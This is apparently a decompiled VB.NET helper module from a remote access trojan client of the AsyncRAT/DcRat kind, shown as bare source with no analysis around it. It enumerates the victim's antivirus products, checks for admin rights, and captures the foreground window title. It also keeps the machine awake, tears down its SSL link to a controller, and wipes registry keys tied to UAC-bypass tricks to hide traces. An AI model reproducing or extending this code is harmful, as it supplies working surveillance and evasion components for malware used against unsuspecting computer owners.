Imports System
Imports System.Drawing.Imaging
Imports System.Management
Imports System.Net.Security
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.Text
Imports Client.Connection
Imports Microsoft.Win32

Namespace Client.Helper
	' Token: 0x02000013 RID: 19
	Public Module Methods
		' Token: 0x06000055 RID: 85 RVA: 0x000022B1 File Offset: 0x000004B1
		Public Function IsAdmin() As Boolean
			Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
		End Function

		' Token: 0x06000056 RID: 86 RVA: 0x0000401C File Offset: 0x0000221C
		Public Sub ClientOnExit()
			Try
				If Convert.ToBoolean(Settings.BS_OD) AndAlso Methods.IsAdmin() Then
					ProcessCritical.[Exit]()
				End If
				MutexControl.CloseMutex()
				Dim sslClient As SslStream = ClientSocket.SslClient
				If sslClient IsNot Nothing Then
					sslClient.Close()
				End If
				Dim tcpClient As Socket = ClientSocket.TcpClient
				If tcpClient IsNot Nothing Then
					tcpClient.Close()
				End If
			Catch
			End Try
		End Sub

		' Token: 0x06000057 RID: 87 RVA: 0x00004094 File Offset: 0x00002294
		Public Function Antivirus() As String
			Dim text2 As String
			Try
				Dim text As String = String.Empty
				Using managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("\\" + Environment.MachineName + "\root\SecurityCenter2", "Select * from AntivirusProduct")
					For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]()
						Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
						text = text + managementObject("displayName").ToString() + "; "
					Next
				End Using
				text = Methods.RemoveLastChars(text, 2)
				text2 = If((Not String.IsNullOrEmpty(text)), text, "N/A")
			Catch
				text2 = "Unknown"
			End Try
			Return text2
		End Function

		' Token: 0x06000058 RID: 88 RVA: 0x000022C7 File Offset: 0x000004C7
		Public Function RemoveLastChars(input As String, Optional amount As Integer = 2) As String
			If input.Length > amount Then
				input = input.Remove(input.Length - amount)
			End If
			Return input
		End Function

		' Token: 0x06000059 RID: 89 RVA: 0x00004188 File Offset: 0x00002388
		Public Function GetEncoder(format As ImageFormat) As ImageCodecInfo
			For Each imageCodecInfo As ImageCodecInfo In ImageCodecInfo.GetImageDecoders()
				If imageCodecInfo.FormatID = format.Guid Then
					Return imageCodecInfo
				End If
			Next
			Return Nothing
		End Function

		' Token: 0x0600005A RID: 90
		Public Declare Function SetThreadExecutionState Lib "kernel32.dll" (esFlags As NativeMethods.EXECUTION_STATE) As NativeMethods.EXECUTION_STATE

		' Token: 0x0600005B RID: 91 RVA: 0x000041D0 File Offset: 0x000023D0
		Public Sub PreventSleep()
			Try
				Methods.SetThreadExecutionState(CType(2147483651UI, NativeMethods.EXECUTION_STATE))
			Catch
			End Try
		End Sub

		' Token: 0x0600005C RID: 92 RVA: 0x00004204 File Offset: 0x00002404
		Public Function GetActiveWindowTitle() As String
			Try
				Dim stringBuilder As StringBuilder = New StringBuilder(256)
				If NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0 Then
					Return stringBuilder.ToString()
				End If
			Catch
			End Try
			Return ""
		End Function

		' Token: 0x0600005D RID: 93 RVA: 0x00004260 File Offset: 0x00002460
		Public Sub ClearSetting()
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Environment")
				If registryKey.GetValue("windir") IsNot Nothing Then
					registryKey.DeleteValue("windir")
				End If
				registryKey.Close()
			Catch
			End Try
			Try
				Registry.CurrentUser.OpenSubKey("Software", True).OpenSubKey("Classes", True).DeleteSubKeyTree("mscfile")
			Catch
			End Try
			Try
				Registry.CurrentUser.OpenSubKey("Software", True).OpenSubKey("Classes", True).DeleteSubKeyTree("ms-settings")
			Catch
			End Try
		End Sub
	End Module
End Namespace
